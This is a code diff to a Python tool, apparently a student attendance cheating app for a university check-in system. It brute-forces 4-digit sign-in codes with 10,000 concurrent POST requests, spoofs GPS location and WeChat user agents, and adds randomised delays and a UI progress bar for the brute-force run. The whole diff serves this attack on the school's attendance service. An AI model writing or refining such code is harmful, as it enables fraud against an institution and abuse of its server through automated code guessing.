@@ -51,6 +51,8 @@ total_requests = 10000  # 总请求数
 concurrent_limit = 20  # 最大并发数
 timeout_secs = 10
 
+main_window = None
+
 user_agents = [
     "Mozilla/5.0 (Linux; Android 13; 2211133C Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 MMWEBID/5678 MicroMessenger/8.0.40.2420(0x28002837) Process/appbrand2 WeChat/8.0.40 NetType/4G Language/zh_CN ABI/arm64 MiniProgramEnv",
     "Mozilla/5.0 (Linux; Android 12; ABY-AL00 Build/HUAWEIABY-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.5845.114 Mobile Safari/537.36 MMWEBID/1234 MicroMessenger/8.0.42.2460(0x28002A34) Process/appbrand0 WeChat/8.0.42 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv",
@@ -132,7 +134,7 @@ def signWithCode(student, classId, code, location):
     print("getXsQdInfo", pl)
 
     signInfoResult = send_post("getXsQdInfo", pl)
-    time.sleep(0.4)
+    time.sleep(random.uniform(0.2, 0.4))
     pl1 = payLoadsUtils.process_GetGpsWzJl(student,qdkblist[classId]["qdId"],location)
     print("getGpsWzJl", pl1)
     distanceResult = send_post("getGpsWzJl", pl1)
@@ -143,7 +145,7 @@ def signWithCode(student, classId, code, location):
         print(f"距离验证失败，距离{distanceResult["signResult"]}")
         return 2
 
-    time.sleep(0.4)
+    time.sleep(random.uniform(0.2, 0.4))
     pl2 = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],code,location)
     print("saveXsQdInfo", pl2)
     signResult = send_post("saveXsQdInfo", pl2)
@@ -162,21 +164,42 @@ async def signWithoutCode(student, classId, location):
     semaphore = asyncio.Semaphore(concurrent_limit)
     url = serverUrl + "/saveXsQdInfo"
     payload = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],"0000",location)
-    index = 0
+
     # 使用 ClientSession 复用连接池
     async with aiohttp.ClientSession() as session:
         tasks = []
         for i in range(total_requests):
             # 创建任务
-            task = asyncio.ensure_future(send_post_request(url, payload, session, semaphore, str(index).zfill(4)))
+            token = str(i).zfill(4)
+            task = asyncio.ensure_future(send_post_request(url, payload, session, semaphore, token))
             tasks.append(task)
 
-        # 使用 tqdm 显示进度条
-        responses = [await f for f in tqdm(asyncio.as_completed(tasks), total=len(tasks))]
+        pbar = tqdm(total=total_requests, desc="爆破中")
+        count = 0
 
-        # 统计结果
-        success = sum(1 for r in responses if r == 200)
-        print(f"\n完成! 成功: {success}, 失败: {total_requests - success}")
+        # 结果处理循环
+        for f in asyncio.as_completed(tasks):
+            res = await f
+            count += 1
+            pbar.update(1)
+
+            # 每完成 20 个请求更新一次 UI，避免频繁调用 JS 导致卡顿
+            if count % 20 == 0 or count == total_requests:
+                progress_msg = f"已尝试: {count} / {total_requests}"
+                if main_window:
+                    # 调用前端定义的 JS 函数 updateProgressBar
+                    main_window.evaluate_js(f"updateProgressBar({count}, {total_requests}, '{progress_msg}')")
+
+            if stop_event.is_set() or res == "STOPPED":
+                # 命中目标，通知前端成功
+                if main_window:
+                    main_window.evaluate_js(
+                        f"updateProgressBar({total_requests}, {total_requests}, '爆破成功！已找到签到码')")
+                for t in tasks:
+                    if not t.done(): t.cancel()
+                break
+
+        pbar.close()
 
 @app.route('/')
 def index():
@@ -310,5 +333,5 @@ if __name__ == "__main__":
         print("今日无课！")
         ctypes.windll.user32.MessageBoxW(0, "今日无课！", "海大课堂考勤Pro Max", 64)
         exit(114514)
-    webview.create_window('海大课堂考勤Pro Max', app, width=1000, height=600)
+    main_window = webview.create_window('海大课堂考勤Pro Max', app, width=1000, height=600)
     webview.start()
